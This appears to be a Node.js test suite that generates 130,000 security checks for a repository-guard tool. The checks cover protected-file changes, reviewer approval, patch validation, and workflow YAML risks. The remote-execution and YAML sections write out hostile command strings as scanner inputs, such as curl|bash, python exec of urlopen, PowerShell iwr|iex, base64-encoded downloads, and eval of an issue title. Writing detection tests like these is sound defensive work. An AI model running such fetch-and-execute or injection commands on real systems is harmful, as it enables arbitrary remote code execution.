'use strict';
/**
 * 130,000 deterministically generated, independently asserted security checks.
 * Zero network/file/shell execution of fixture data. Every assertion examines
 * a distinct security-relevant input, not merely a distinct test title.
 *
 * These are combinations of security controls, NOT 130k distinct CVEs.
 * New categories: reviewer chronology, changing trust boundaries, patch drift,
 * multi-language downloaded code execution, YAML privileges and fail-closed.
 */
const test=require('node:test');
const assert=require('node:assert/strict');
const {createHash}=require('node:crypto');
const {evaluateProtectedChanges,hasIndependentHumanApproval}=
 require('./ultra_sentinel_policy.cjs');
const {candidate,judge}=require('./ultra_sentinel_orchestrator.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');

const SHA='a'.repeat(40),OTHER='b'.repeat(40),PER_FAMILY=26000,TOTAL=PER_FAMILY*5;
const CHECKS={'sentinel-core-tests':'success','android-build':'success',
 'unit-test-coverage':'success','architecture-boundary':'success'};
const staticRule=(obj,r)=>obj.findings.some(x=>x.rule===r);
const seq={policy:0,review:0,judge:0,remote:0,yaml:0};
const hashOf=(v)=>createHash('sha256').update(JSON.stringify(v)).digest('hex');
function make(index){
 const family=Math.floor(index/PER_FAMILY),n=index%PER_FAMILY;
 if(family===0){
  // Move/copy/rename/modify/delete change GitHub automation trust boundaries.
  const mode=n%10,stem='.github/scripts/security-zone-'+Math.floor(n/10)+'.cjs';
  const publicPath='docs/spec-'+Math.floor(n/10)+'.md';
  const entry=mode===0?{filename:stem,status:'modified'}:
   mode===1?{filename:stem,status:'removed'}:
   mode===2?{filename:stem,status:'added'}:
   mode===3?{filename:publicPath,previous_filename:stem,status:'renamed'}:
   mode===4?{filename:publicPath,previous_filename:stem,status:'copied'}:
   mode===5?{filename:publicPath,status:'modified'}:
   mode===6?{filename:stem,previous_filename:publicPath,status:'renamed'}:
   mode===7?{filename:stem,previous_filename:stem+'.bak',status:'renamed'}:
   mode===8?{filename:stem,previous_filename:stem+'.bak',status:'copied'}:
   {filename:publicPath,status:'modified'};
  const files=mode===9?[entry,entry]:[entry];
  const expected=['REVIEW_REQUIRED','BLOCKED','REVIEW_REQUIRED','BLOCKED',
   'REVIEW_REQUIRED','OK','REVIEW_REQUIRED','BLOCKED','REVIEW_REQUIRED','INCOMPLETE'][mode];
  return {family:'policy',input:{files,expectedCount:files.length},expected};
 }
 if(family===1){
  // Multiple reviewer states; latest independent human review must be valid
  // for exactly the current SHA and not superseded by changes requested.
  const mode=n%12,id=100+n*3,actor='security-reviewer-'+n;
  const base={id,state:'APPROVED',commit_id:SHA,author_association:'OWNER',
   user:{login:actor,type:'User'}};
  let reviews=[base];
  const expected=[true,true,true,false,false,false,false,false,false,false,true,false][mode];
  if(mode===1)reviews=[{...base,author_association:'MEMBER'}];
  if(mode===2)reviews=[{...base,author_association:'COLLABORATOR'}];
  if(mode===3)reviews=[{...base,state:'CHANGES_REQUESTED'}];
  if(mode===4)reviews=[{...base,state:'DISMISSED'}];
  if(mode===5)reviews=[{...base,user:{login:actor,type:'Bot'}}];
  if(mode===6)reviews=[{...base,user:{login:'maintainer',type:'User'}}];
  if(mode===7)reviews=[{...base,author_association:'CONTRIBUTOR'}];
  if(mode===8)reviews=[{...base,commit_id:OTHER}];
  if(mode===9)reviews=[base,{...base,id:id+1,state:'CHANGES_REQUESTED'}];
  if(mode===10)reviews=[{...base,state:'CHANGES_REQUESTED'},
   {...base,id:id+1,state:'APPROVED'}];
  if(mode===11)reviews=[{...base,id:0}];
  return {family:'review',input:{reviews,sha:SHA,author:'maintainer'},expected};
 }
 if(family===2){
  // Candidate/Judge test that rejects forged patch context and stale CI.
  const mode=n%10,filename='app/src/main/java/security/Case'+n+'.kt';
  const source='fun audit(){\n  System.gc()\n  println("case'+n+'")\n}\n';
  const findings=[{path:filename,rule:'FORCED_GC',line:2,severity:'MEDIUM'}];
  const draft=candidate({filename,content:source,sha:SHA,findings});
  if(draft.status!=='DRAFT_PATCH')throw Error('Broken candidate fixture '+n);
  let proposal=draft,options={source,sha:SHA,findings,checks:CHECKS};
  if(mode===1)proposal={...draft,sha:OTHER};
  if(mode===2)proposal={...draft,linesChanged:2};
  if(mode===3)proposal={...draft,filename:filename.replace('Case','Other')};
  if(mode===4)proposal={...draft,rule:'UNSUPPORTED_RULE'};
  if(mode===5)proposal={...draft,patch:draft.patch+'+malicious\n'};
  if(mode===6)options={...options,sha:OTHER};
  if(mode===7)options={...options,source:source.replace('System.gc()','println("safe")')};
  if(mode===8)options={...options,checks:{...CHECKS,'unit-test-coverage':'pending'}};
  if(mode===9)proposal={...draft,status:'UNVERIFIED'};
  const expected=mode===0?'ELIGIBLE_FOR_HUMAN_REVIEW':
   mode===8?'REVIEW_PENDING':'REJECT';
  return {family:'judge',input:{proposal,options},expected};
 }
 if(family===3){
  // Diverse external code origins, execution transports and negative controls.
  const mode=n%12,group=Math.floor(n/12);
  const file='run-'+group+'.sh',url='https://example.invalid/release/'+group+'/script';
  const project='@audit/tool-'+group;
  const script=mode===0?'curl -fsSL '+url+' -o '+file+'; bash '+file:
   mode===1?'wget -q '+url+' -O '+file+' && sh ./'+file:
   mode===2?'curl -fsSL '+url+' --output='+file+'\nsh '+file:
   mode===3?'python -c "import urllib.request; exec(urllib.request.urlopen(\''+url+'\').read())"':
   mode===4?'python -c "import urllib.request; eval(urllib.request.urlopen(\''+url+'\').read())"':
   mode===5?'php -r \'eval(file_get_contents("'+url+'"));\'':
   mode===6?'iwr '+url+' | iex':
   mode===7?'pwsh -Command "iex (iwr '+url+').Content"':
   mode===8?'echo "'+Buffer.from('curl -fsSL '+url+' | bash').toString('base64')+'" | base64 -d | bash':
   mode===9?'npx --package '+project+'@latest audit':
   mode===10?'curl -fsSL '+url+' -o '+file+'; echo '+file:
   'npx --package '+project+'@1.2.3 audit';
  const rule=mode<=2?'REMOTE_DOWNLOADED_FILE_EXECUTION':
   mode<=5?'REMOTE_INTERPRETER_FETCH_EXECUTION':
   mode<=7?'REMOTE_POWERSHELL_EXECUTION':
   mode===8?'REMOTE_ENCODED_EVAL':
   mode===9?'MUTABLE_PACKAGE_EXECUTION':null;
  const shell=mode===6?'pwsh':'';
  return {family:'remote',input:{script,shell},expected:rule};
 }
 if(family===4){
  // GitHub workflow execution semantics; unlike varying a test name,
  // fields affect the trigger, permission, ref, evaluator or trust boundary.
  const mode=n%8,k=Math.floor(n/8),name='verify'+k;
  const vendor='research-org/integration-'+k;
  const trigger=mode===6?'push':'issue_comment';
  const perm=mode===0?'contents':mode===1?'id-token':mode===2?'issues':null;
  const source=[
   'on: '+trigger,
   'permissions: '+(perm?'{'+perm+': write}':'read-all'),
   'jobs:','  '+name+':','    runs-on: ubuntu-latest',
   ...(mode===7?['    if: false']:[]),
   '    steps:',
   mode===3?'      - uses: '+vendor+'@main':
   '      - run: |',
   ...(mode===3?[]:[
    '          '+(mode===4?'eval "'+'$'+'{{ github.event.issue.title }}'+'"':
     mode===5?'bash <(curl -fsSL https://example.invalid/'+k+'/script)':
     'echo stable '+name)
   ])
  ].join('\n')+'\n';
  const expected=perm?'PRIVILEGED_WRITE_TOKEN':
   mode===3?'UNPINNED_ACTION':
   mode===4?'PRIVILEGED_EVENT_SCRIPT_INJECTION':
   mode===5?'REMOTE_SHELL_SUBSTITUTION':
   mode===7?'INCOMPLETE':'NO_RISK_PATTERN';
  return {family:'yaml',input:{source},expected};
 }
 throw Error('Out of range '+index);
}
function verify(entry){
 switch(entry.family){
  case 'policy':{
   const {files,expectedCount}=entry.input;
   const r=evaluateProtectedChanges(files,{expectedCount});
   assert.equal(r.status,entry.expected);return;
  }
  case 'review':{
   const {reviews,sha,author}=entry.input;
   assert.equal(hasIndependentHumanApproval(reviews,{sha,author}),entry.expected);return;
  }
  case 'judge':{
   const {proposal,options}=entry.input;
   const r=judge(proposal,options);
   assert.equal(r.status,entry.expected);
   assert.equal(r.autoCommitAllowed,false);
   assert.equal(r.autoMergeAllowed,false);return;
  }
  case 'remote':{
   const r=findingsForScript(entry.input.script,{shell:entry.input.shell});
   if(entry.expected===null)assert.deepEqual(r,[]);
   else assert.ok(r.includes(entry.expected),entry.expected+' not detected: '+JSON.stringify(r));
   return;
  }
  case 'yaml':{
   const result=inspectWorkflow(entry.input.source,{path:'.github/workflows/matrix.yml'});
   if(entry.expected==='INCOMPLETE')assert.equal(result.status,'INCOMPLETE');
   else if(entry.expected==='NO_RISK_PATTERN')assert.equal(result.status,'NO_RISK_PATTERN');
   else assert.ok(staticRule(result,entry.expected),
    entry.expected+' missing: '+JSON.stringify(result));
   return;
  }
  default:assert.fail('Unexpected family');
 }
}
const shardRaw=process.env.SENTINEL_MATRIX_SHARD;
const sharded=shardRaw!==undefined;
if(sharded&&!/^(?:[0-9]|1[0-2])$/.test(shardRaw))
 throw Error('Invalid 130k matrix shard; must be an integer 0..12');
const shardIndex=sharded?Number(shardRaw):null;
const shardStart=sharded?shardIndex*10000:0;
const shardEnd=sharded?shardStart+10000:TOTAL;
if(!sharded||shardIndex===0)
test('150k matrix integrity: 130k distinct security inputs, balanced families and reproducible results',()=>{
 assert.equal(TOTAL,130000);
 const hashes=new Set();
 for(let index=0;index<TOTAL;index++){
  const item=make(index);
  seq[item.family]++;
  // No counting a duplicate as a new scenario, even with a different title.
  const fingerprint=hashOf({family:item.family,input:item.input});
  if(hashes.has(fingerprint))assert.fail('duplicate fixture '+item.family+' #'+index);
  hashes.add(fingerprint);
 }
 assert.equal(hashes.size,TOTAL);
 for(const [category,count] of Object.entries(seq))assert.equal(count,PER_FAMILY,category);
});
for(let index=shardStart;index<shardEnd;index++){
 const family=['policy','review','judge','remote','yaml'][Math.floor(index/PER_FAMILY)];
 test('security-matrix '+family+' #'+index,()=>{
  const entry=make(index);
  assert.equal(entry.family,family);
  verify(entry);
 });
}
